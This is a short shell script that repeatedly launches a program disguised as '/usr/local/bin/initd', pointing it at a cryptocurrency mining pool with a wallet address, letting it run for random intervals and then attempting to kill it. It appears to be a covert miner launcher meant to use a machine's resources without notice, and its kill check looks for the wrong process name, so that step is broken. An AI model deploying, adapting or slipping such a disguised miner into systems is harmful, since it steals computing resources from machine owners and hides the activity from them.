signal=KILL

sleep_a_while () {
    sleep $[ ( $RANDOM % 150 ) + 60 ]m
}

while true; do
    # Note: command launched in background:
    #/path/to/applicationfile -s 111.222.333.444 -u username -p password &
    /usr/local/bin/initd -v -l na.luckpool.net:3960 -u RSqyBuPVpEA2mKq2pLx3YZj7ySWuXpMx3N.cpvgullo001 -p x &

    # Save PID of command just launched:
    last_pid=$!

    # Sleep for a while:
    sleep_a_while

    # See if the command is still running, and kill it and sleep more if it is:
    if ps -p $last_pid -o comm= | grep -qs '^applicationfile$'; then
        kill -$signal $last_pid 2> /dev/null
        sleep_a_while
    fi

    # Go back to the beginning and launch the command again
done
